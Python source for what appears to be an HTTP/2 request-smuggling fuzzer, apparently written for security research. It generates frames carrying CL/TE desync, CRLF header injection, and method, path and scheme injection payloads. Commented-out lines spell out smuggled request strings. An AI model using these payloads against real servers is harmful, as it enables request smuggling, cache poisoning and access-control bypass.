from mutation import *
import json
import os

def gen_header_frame(method, scheme, authority, path ,flags, id, verbose=True):
    # TODO: 对:authority、:method、:scheme修改
    # * 1. :method 目标URL模式部分(请求)
    # * 2. :scheme 目标URL模式部分(请求) 
    # * 3. :authority 目标URL认证部分(请求)
    # * 4. :path 

    if verbose:
        path = "/reqid=%s" %id

    #pseudo_header = {":method": method, ":scheme": scheme, ":authority": authority, ":path": path,"flags": flags}
    head_frame =  {"<headers-frame-%s>"%id: {":method": method, ":scheme": scheme, ":authority": authority, ":path": path,"flags": flags}}
    # head_frame =  {"<headers-frame>": {":method": "POST", ":scheme": "https", ":authority": "127.0.0.1", "flags": []}}
    # head_frame["<headers-frame>"][':path'] = "/reqid=%s" %id
    return head_frame

# ! 使用continuation frame 和直接将header fileds 放在header frame里有区别吗？

def gen_continue_frame(header_fileds,flags,id):
    # [['foo','bar'], ['aaa','bbb']]
    continue_frame =  {"<continuation-frame-%s>"%id: {"flags": flags}}
    # TODO 这种用于多个header的情况目前暂时不需要拓展
    # for header_name, header_value in header_fileds.items():
    #     continue_frame["<continuation-frame-%s>"%id][header_name] = header_value

    header_name = header_fileds[0]
    header_value = header_fileds[1]
    continue_frame["<continuation-frame-%s>"%id][header_name] = header_value
    return continue_frame


def gen_data_frame(data,flags,id):
    data_frame = {"<data-frame-%s>"%id: {"data":data,"flags": flags}}
    return data_frame




def gen_req(frames):
    req = {}
    for frame in frames:
        for frame_name, frame_value in frame.items():
            req[frame_name] = frame_value
    return req

def gen_all_te_req(te_list):
    i = 1
    req_list = []
    for te in te_list:
        head_frame = gen_header_frame(method="POST", scheme="https", authority="127.0.0.1", path="/" ,flags=[], id=i, verbose=True)
        continue_frame = gen_continue_frame(header_fileds=te,flags=["EH"],id=i)
        data_frame = gen_data_frame(data='5\r\nBBBBB\r\n0\r\n\r\n',flags=["ES"],id=i)
        i+=1
        req = gen_req(frames=[head_frame, continue_frame, data_frame])
        req_list.append(req)
    return req_list


def gen_all_cl_req(cl_list):
    i = 1
    req_list = []
    for cl in cl_list:
        head_frame = gen_header_frame(method="POST", scheme="https", authority="127.0.0.1", path="/" ,flags=[], id=i, verbose=True)
        continue_frame = gen_continue_frame(header_fileds=cl,flags=["EH"],id=i)
        data_frame = gen_data_frame(data='BBBBB',flags=["ES"],id=i)
        i+=1
        req = gen_req(frames=[head_frame, continue_frame, data_frame])
        req_list.append(req)
    return req_list


# *URL前缀注入
def gen_scheme_inject_req(prefix_list):
    i = 1
    req_list = []
    for prefix in prefix_list:
        head_frame = gen_header_frame(method="GET", scheme=prefix, authority="127.0.0.1", path="/" ,flags=["ES", "EH"], id=i, verbose=True)
        i+=1
        req = gen_req(frames=[head_frame])
        req_list.append(req)
    return req_list

# *method请求行注入
def gen_method_inject_req(method_list):
    i = 1
    req_list = []
    for method_inject in method_list:
        head_frame = gen_header_frame(method=method_inject, scheme="https", authority="127.0.0.1", path="/" ,flags=["ES", "EH"], id=i, verbose=True)
        i+=1
        req = gen_req(frames=[head_frame])
        req_list.append(req)
    return req_list
def gen_path_inject_req(path_list):
    i = 1
    req_list = []
    for path_inject in path_list:
        head_frame = gen_header_frame(method="POST", scheme="https", authority="127.0.0.1", path=path_inject ,flags=["ES", "EH"], id=i, verbose=False)
        i+=1
        req = gen_req(frames=[head_frame])
        req_list.append(req)
    return req_list

# *http篡改包装
def gen_poison_header_inject_req(poison_header_list):
    i = 1
    req_list = []
    for poison_header in poison_header_list:
        head_frame = gen_header_frame(method="GET", scheme="https", authority="127.0.0.1", path="/" ,flags=[], id=i, verbose=True)
        continue_frame = gen_continue_frame(header_fileds=poison_header,flags=["EH","ES"],id=i)
        i+=1
        req = gen_req(frames=[head_frame, continue_frame])
        req_list.append(req)
    return req_list

# TODO double path有点麻烦 直接自己手动写json

# * header name拆分
def gen_header_name_newline_inject_req(header_name_newline_inject_list):
    i = 1
    req_list = []
    for header_name_newline_inject in header_name_newline_inject_list:
        head_frame = gen_header_frame(method="POST", scheme="https", authority="127.0.0.1", path="/" ,flags=[], id=i, verbose=True)
        continue_frame = gen_continue_frame(header_fileds=header_name_newline_inject,flags=["EH"],id=i)
        data_frame = gen_data_frame(data='5\r\nBBBBB\r\n0\r\n\r\n',flags=["ES"],id=i)
        i+=1
        req = gen_req(frames=[head_frame, continue_frame,data_frame])
        req_list.append(req)
    return req_list
# * header value拆分
def gen_header_value_newline_inject_req(header_value_newline_inject_list):
    i = 1
    req_list = []
    for header_value_newline_inject in header_value_newline_inject_list:
        head_frame = gen_header_frame(method="POST", scheme="https", authority="127.0.0.1", path="/" ,flags=[], id=i, verbose=True)
        continue_frame = gen_continue_frame(header_fileds=header_value_newline_inject,flags=["EH"],id=i)
        data_frame = gen_data_frame(data='5\r\nBBBBB\r\n0\r\n\r\n',flags=["ES"],id=i)
        i+=1
        req = gen_req(frames=[head_frame, continue_frame,data_frame])
        req_list.append(req)
    return req_list



# save attack data to json format
def save_mutated_data(attack_type,attack_req_list):
    
    attack_req_dict = {}
    i = 0
    for req in attack_req_list:
        i += 1
        attack_req_dict['reqid_%s' %i] = req
    # * save data in attack_data
    file_name = "../attack_data/" + str(attack_type) + '_attack_data.json'
    with open(file_name, 'w') as f:
        json_str = json.dumps(attack_req_dict, indent=0)
        f.write(json_str)
        f.write('\n')


def check_file(check_file_name):
    # check_file_name = "cl_attack_data.json"
    dir_path = "../attack_data"
    # for file in os.listdir(dir_path):
    if check_file_name in os.listdir(dir_path):
        print("data exist")
    else:
        if check_file_name.startswith('cl'):
            print("gen all cl attack data")
            attack_req_list = gen_all_cl_req(cl_list = gen_all_cl())
            save_mutated_data(attack_type="cl",attack_req_list=attack_req_list)
        # TODO te大小写攻击没拆开
        elif check_file_name.startswith('te'):
            print("gen all te attack data")
            attack_req_list = gen_all_te_req(te_list = gen_all_te())
            save_mutated_data(attack_type="te",attack_req_list=attack_req_list)
        elif check_file_name.startswith('scheme_inject'):
            print("gen scheme inject attack data")
            attack_req_list = gen_scheme_inject_req(prefix_list = gen_scheme_inject_payload())
            save_mutated_data(attack_type="scheme_inject",attack_req_list=attack_req_list)
        elif check_file_name.startswith('header_name_newline_inject'):
            print("gen header name newline inject attack data")
            attack_req_list = gen_header_name_newline_inject_req(header_name_newline_inject_list = gen_header_name_newline_inject_payload())
            save_mutated_data(attack_type="header_name_newline_inject",attack_req_list=attack_req_list)
        elif check_file_name.startswith('header_value_newline_inject'):
            print("gen header value newline inject attack data")
            attack_req_list = gen_header_value_newline_inject_req(header_value_newline_inject_list=gen_header_value_newline_inject_payload())
            save_mutated_data(attack_type="header_value_newline_inject",attack_req_list=attack_req_list)
        elif check_file_name.startswith('poison_header_inject'):
            print("gen poison header inject attack data")
            attack_req_list = gen_poison_header_inject_req(poison_header_list=gen_poison_header_inject_payload())
            save_mutated_data(attack_type="poison_header_inject",attack_req_list=attack_req_list)
        elif check_file_name.startswith('method_inject'):
            print("gen method inject attack data")
            attack_req_list = gen_method_inject_req(method_list=gen_method_inject_payload())
            save_mutated_data(attack_type="method_inject",attack_req_list=attack_req_list)
        elif check_file_name.startswith('path_inject'):
            print("gen path inject attack data")
            attack_req_list = gen_path_inject_req(path_list=gen_path_inject_patload())
            save_mutated_data(attack_type="path_inject",attack_req_list=attack_req_list)


if __name__ == "__main__":
    check_file("path_inject_attack_data.json")
    # req_list = gen_all_te_req(te_list = gen_te1())
    # print(len(req_list))
    # print(req_list[:2])
    
    # req_list = gen_all_cl_req(cl_list = gen_cl4())
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="cl",attack_req_list=req_list)

    # req_list = gen_all_te_req(te_list = gen_te1())
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="te",attack_req_list=req_list)
    
    # req_list = gen_scheme_inject_req(prefix_list=["http://a.example.com?", "https://a.example.com?"])
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="scheme_inject",attack_req_list=req_list)

    # req_list = gen_method_inject_req(method_list=["GET / HTTP/1.1\r\nTransfer-encoding:chunked\r\nx:x","GET / HTTP/1.1\rTransfer-encoding:chunked\rx:x","GET / HTTP/1.1\nTransfer-encoding:chunked\nx:x",
    #                                             "GET / HTTP/1.1\r\nTransfer-encoding: chunked\r\nx: x","GET / HTTP/1.1\rTransfer-encoding: chunked\rx: x","GET / HTTP/1.1\nTransfer-encoding: chunked\nx: x"])
    # req_list = gen_method_inject_req(method_list=gen_method_inject_payload())
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="method_inject",attack_req_list=req_list)

    # req_list = gen_path_inject_req(path_list=["/ HTTP/1.1\r\nHost:127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx:x","/ HTTP/1.1\rHost:127.0.0.1\r\rGET / HTTP/1.1\rx:x","/ HTTP/1.1\nHost:127.0.0.1\n\nGET / HTTP/1.1\nx:x",
    #                                             "/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx: x","/ HTTP/1.1\rHost: 127.0.0.1\r\rGET / HTTP/1.1\rx: x","/ HTTP/1.1\nHost: 127.0.0.1\n\nGET / HTTP/1.1\nx: x"])
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="path_inject",attack_req_list=req_list)

    # req_list = gen_poison_header_inject_req1(poison_header_list=[[" posion", "x"],["\x00posion", "x"],["\tposion", "x"], ["\vposion", "x"],["\u0085posion", "x"],["\u00A0posion", "x"],["\U000130BAposion", "x"]])
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="poison_header_inject",attack_req_list=req_list)

    # req_list = gen_header_name_newline_inject_req1(header_name_newline_inject_list=[["X:x\r\nfoo","bar"],["X:x\rfoo","bar"],["X:x\nfoo","bar"],
    #                                                                                 ["X: x\r\nfoo","bar"],["X: x\rfoo","bar"],["X: x\nfoo","bar"]])
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="header_name_newline_inject",attack_req_list=req_list)

    # req_list = gen_header_value_newline_inject_req1(header_value_newline_inject_list=[["foo","bar\r\nX:x"],["foo","bar\rX:x"],["foo","bar\nX:x"],
    #                                                                                 ["foo","bar\r\nX: x"],["foo","bar\rX: x"],["foo","bar\nX: x"],
    #                                                                                 ["foo","bar\r\nX:-00000000000x"],["foo","bar\rX:-00000000000x"],["foo","bar\nX:-00000000000x"],
    #                                                                                 ["foo","bar\r\nX: -00000000000x"],["foo","bar\rX: -00000000000x"],["foo","bar\nX: -00000000000x"],
    #                                                                                 ["foo","bar\r\nX:00000000000x"],["foo","bar\rX:00000000000x"],["foo","bar\nX:00000000000x"],
    #                                                                                 ["foo","bar\r\nX: 00000000000x"],["foo","bar\rX: 00000000000x"],["foo","bar\nX: 00000000000x"]])
    # print(len(req_list))
    # print(req_list)
    # save_mutated_data(attack_type="header_value_newline_inject",attack_req_list=req_list)